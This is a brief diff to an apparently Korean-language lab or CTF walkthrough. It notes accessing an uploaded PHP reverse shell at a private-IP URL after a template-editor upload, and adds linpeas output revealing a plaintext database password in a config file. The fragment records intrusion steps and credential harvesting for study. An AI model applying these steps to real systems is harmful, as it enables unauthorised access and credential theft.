@@ -124,6 +124,9 @@ Template editor에서 쉘 업로드 후 아래 url로 접근
 http://192.168.207.39/skins/php-reverse-shell.phtml
 
 # linpeas.sh 돌리기
+╔══════════╣ Searching passwords in config PHP files
+/var/www/config.php:$db_password = 'root';    
+
 
 
 ```
